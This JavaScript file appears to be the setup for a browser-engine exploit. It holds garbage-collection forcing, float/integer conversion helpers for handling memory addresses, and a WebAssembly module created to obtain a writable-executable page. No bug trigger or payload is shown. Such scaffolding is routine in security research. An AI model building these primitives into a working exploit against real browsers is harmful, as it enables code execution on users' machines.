function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }

var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v) {
    f64[0] = v;
    return u32;
}

function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }
    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}

// for dump
function view(array, lim) {
    for(let i = 0; i < lim; i++) {
        t = array[i];
        console.log("[" + i + "] : " + hex(d2u(t)[0], d2u(t)[1]));
    }
}

// for rwx page
let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;
